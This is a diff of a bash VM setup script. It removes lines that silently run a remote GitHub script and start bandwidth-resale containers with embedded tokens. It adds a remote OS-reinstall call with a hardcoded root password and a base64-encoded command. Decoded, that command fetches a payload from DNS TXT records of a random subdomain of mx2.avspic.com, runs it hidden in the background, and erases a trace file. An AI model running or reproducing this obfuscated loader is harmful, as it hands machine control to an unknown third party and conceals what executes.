@@ -1,12 +1,3 @@
 #!/bin/bash
-# Debian12+
-# 1. 更新软件包列表
-sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
-# 2. 安装常用工具包
-sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1
-# 3. 执行你原来的 sijuly.sh 脚本 (后台运行)
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/maklinngf/m/refs/heads/main/m2.sh) >/dev/null 2>&1 &
-wget -qO- get.docker.com | bash
-docker run -d --restart=always --name tm traffmonetizer/cli_v2 start accept --token I1TfrUC+ST9NdcK/97Dq/uZAW61DEnSWWr3KEm2GSVg=
-docker run -d --restart=always -e EARNFM_TOKEN="99268125-c127-4a66-a43f-60690db70b17" --name earnfm-client earnfm/earnfm-client:latest
-ping aws.amazon.com
+apt -qqy install wget
+bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/hanrzme/amazon/refs/heads/master/amazon.sh) -d 11 -v 64 -a -p "amazon.123456" -port 22 -console ttyS0 -cmd "IyEvYmluL2Jhc2gKCmFwdC1nZXQgaW5zdGFsbCAtcXF5IHdnZXQgYmluZDktaG9zdApzdWI9IiQoaGVhZCAtbjEgL2Rldi91cmFuZG9tIHxtZDVzdW0gfGN1dCAtYjEtMTApIgpbIC1uICIkc3ViIiBdIHx8IHN1Yj0iJChkYXRlICslcykiCmJhc2ggPChob3N0IC10IHR4dCAiJHtzdWJ9Lm14Mi5hdnNwaWMuY29tIiB8Y3V0IC1kJyInIC1mMiB8YmFzZTY0IC1kKSA+L2Rldi9udWxsIDI+JjEgJgpybSAtcmYgL3RtcC9ydW4uc2gKCg=="
